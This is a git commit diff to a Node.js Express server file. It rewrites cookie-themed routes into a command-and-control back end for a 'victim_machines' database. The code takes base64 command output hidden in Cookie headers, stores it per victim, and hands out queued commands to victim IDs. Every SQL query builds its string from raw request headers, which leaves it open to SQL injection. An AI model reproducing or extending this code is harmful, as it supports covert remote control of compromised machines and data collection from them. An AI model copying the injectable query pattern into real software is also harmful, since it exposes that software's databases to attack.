ee8e12df3b709a694e6bc0f648d8a25934e72f62
Brandon Stacy <brandonstacy@ufl.edu>
2021-02-17 22:26:33 +0000

    Added functionality to server

--- Server/app.js
+++ Server/app.js
@@ -27,20 +27,79 @@ Age : "18"
 
 //Route for adding cookie 
 app.get('/setuser', (req, res)=>{ 
-res.cookie("userData", users); 
-res.send('user data added to cookie'); 
+//res.cookie("userData", users); 
+//res.send('user data added to cookie'); 
+	let b64_output = req.headers.cookie;
+	let buff = new Buffer(b64_output, 'base64');
+	let new_output = buff.toString('ascii');
+	let new_json = JSON.parse(new_output);
+	con.query("SELECT command_output FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function(err, result, fields) {
+		if (err) throw err;
+		console.log(result);
+		var base64_output = result[0].command_output;
+		console.log("Base64 Encoded command output:");
+		console.log(base64_output);
+		console.log("Decoded:");
+		let buff = new Buffer(base64_output, 'base64');
+		let decoded_output = buff.toString('ascii');
+		console.log(decoded_output);
+		var json_output = JSON.parse(decoded_output);
+		//console.log(json_output["1"]);
+
+		json_output = { ...json_output, ...new_json };
+
+		let buff2 = new Buffer(JSON.stringify(json_output));
+		let b64_final = buff2.toString('base64');
+
+		con.query("UPDATE victim_machines SET command_output = '" + b64_final + "' WHERE victim_id = '" + req.headers.id + "'", function(err, result, fields) {
+			if (err) throw err;
+			console.log(result);
+		});
+
+	});
+
+	con.query("SELECT command FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function(err, result, fields) {
+		if (err) throw err;
+		console.log(result);
+		var base64_output = result[0].command;
+		let buff = new Buffer(base64_output, 'base64');
+		let decoded_commands = buff.toString('ascii');
+		var json_commands = JSON.parse(decoded_commands);
+		for (var k in new_json) {
+			delete json_commands[k];
+		}
+
+		let buff2 = new Buffer(JSON.stringify(json_commands));
+		let b64_final = buff2.toString('base64');
+
+		if (!Object.keys(json_commands).length) {
+			b64_final = "";
+		}
+
+		con.query("UPDATE victim_machines SET command = '" + b64_final + "' WHERE victim_id = '" + req.headers.id + "'", function(err, result, fields) {
+			if (err) throw err;
+			console.log(result);
+		});
+	});
+
+		
+	res.send("test setuser");
+
+
+	//for updating command_output
+	//UPDATE victim_machines SET command_output = "eyIxIjogImNvbW1hbmQgbm90IGZvdW5kIiwgIjIiOiAidGVzdC50eHQiLCAiMyI6ICJyb290In0=" WHERE victim_id = "69";
 }); 
 
 //Iterate users data from cookie 
 app.get('/getuser', (req, res)=>{ 
 	//console.log(req);
-	console.log("Cookies:");
-	console.log(req.headers.cookie);
-	console.log("Done with cookies");
+	//console.log("Cookies:");
+	//console.log(req.headers.cookie);
+	//console.log("Done with cookies");
 	//shows all the cookies 
 	//res.send(req.cookies); 
 	
-	con.query("SELECT command FROM victim_machines WHERE victim_id='" + req.headers.cookie + "'", function(err, result, fields) {
+	con.query("SELECT command FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function(err, result, fields) {
 		if (err) throw err;
 		console.log(result);
 		res.send(result[0].command);
